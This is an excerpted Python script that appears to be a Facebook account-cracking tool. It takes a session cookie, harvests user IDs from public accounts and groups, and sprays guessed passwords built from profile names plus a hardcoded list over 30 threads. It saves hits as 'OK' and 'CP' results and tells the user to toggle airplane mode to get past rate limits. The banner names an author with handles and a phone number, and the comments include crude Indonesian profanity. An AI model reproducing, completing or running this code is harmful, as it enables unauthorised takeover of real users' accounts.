...
\x1b[38;5;208m╭────────────────────────────────────────────────────────────────────╮
\x1b[38;5;208m│\x1b[1;96m    \x1b[38;5;226mAuthor   :  MuDassir__ALI │
\x1b[38;5;208m│\x1b[1;96m    \x1b[38;5;226mFB     :  Veer_Khanoo & Setamgar_Halak│
\x1b[38;5;208m│\x1b[1;96m    \x1b[38;5;226mWhatsaap : +923439635677  │
\x1b[38;5;208m│\x1b[1;96m    \x1b[38;5;226mNick Name   : Tanhai ka badshah     │
\x1b[38;5;208m└────────────────────────────────────────────────────────────────────┘
"""%(kk))
...
def login_kontol():
	banner()
	print("""%s\x1b[38;5;208m─────────────────────────────────────────────────────────────────────"""%(h))
	print("""%s    \33[1;32mMASUKAN COOKIE FACEBOOK """%(h))
	print("""%s\x1b[38;5;208m─────────────────────────────────────────────────────────────────────"""%(h))
	panda = input(x+' \x1b[38;5;248m[\x1b[38;5;46m>_\x1b[38;5;248m] \33[1;96mMASUKAN COOKIE : ')
	...
	try:
		...
		print("""%s \n"""%(h))
		print("""%s\x1b[38;5;208m─────────────────────────────────────────────────────────────────────"""%(h))
		jalan('%s [%s>_%s] %s\33[1;96mLOGIN SUCCESSFUL RUN THE TOOLS'%(M,P,M,P))
		print("""%s\x1b[38;5;208m─────────────────────────────────────────────────────────────────────"""%(h))
		print("""%s \33[1;96mJalan kan perintah python Lala.py """%(h))
		time.sleep(2.5)
		exit()
	except KeyError:
		print("""%s \n"""%(h))
		jalan('%s [%s>_%s] %sLOGIN FAILED CHECK YOUR ACCOUNT CURRENT'%(M,P,M,P))
		time.sleep(2.5)
		login_kontol()
	except requests.exceptions.ConnectionError:
...
def menu(my_name):
	...
	print("""%s \33[m[02] \33[1;33mCHECK CRAC RESULTS  """%(h))
	print("""%s \33[m[03] \33[1;33mCHECK CP OPTIONS """%(h))
...
def dump_massal():
	clear()
	banner()
	print("""%s  \33[m[~_~]\33[1;32mCRACK FROM PUBLIC ACCOUNT ID\33[m[~_~]"""%(h))
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	print(x+'\33[m[ ! ] \33[1;96mENTER NUMBER OF ID CRACK [ limit 15 ]')
	try:
		jum = int(input(x+'\33[m[ ? ] \33[1;96mWANT TO CRACK HOW MUCH ID ? '))
	except ValueError:
		pesan = '# INPUT WHAT YOU ENTERED IS NOT A NUMBER'
...
def passwrd():
	...
	banner()
	print("""%s ●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●● """%(h))
	print("""%s\33[m•OK Result Saved To : OK/%s\n\33[m•CP Results Saved To : CP/%s\n\33[m•TOURN ON/OF EVERY AIRPLANE MODE 500 Id\n\33[1;33m•WHILE WAITING FOR THE CRACK PROCESS\n\33[1;33m•DI SARANKAN COLI OM"""%(h,okc,cpc))
	print("""%s ●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●● """%(h))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayangku','sayang123','william gz','bismillah','anjing','katasandi','sandi123,malang,bismillah123,123455,pawangku,cintasuci,kontol,tempek,jembut, ngentod,pinter,karaoke,fatimah,prasitio,khusnatun,hasanah,burung,manukku,semoga ok,yuzong,nunggu,setiap,pesawat,melaju,akuselalu,colisambil,liatpramugari']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
	...
	print('')
	print("""%s ●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●● """%(h))
	woi = input(x+'\33[1;96m•Want to Show Crack Result Options? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					print(f"\33[1;33m╚══[CP veer]\33[1;33m{idf}\33[m•\33[1;33m{pw}\n")
					cp+=1
				break
				...
				if 'no' in taplikasi:
					...
					print('\n')
					print(f"\33[1;32m╚══[OK veer]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					break
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [veer V2] %s/%s ~_~ [OK*%s | CP*%s ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+m+" \33[1;32mIf Stack, Airplane Mode 5 Seconds")
	print(balmond+m+" \33[1;32mCollecting IDs")
	print(balmond+m+" \33[1;32mPress CTRL + C To Stop")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
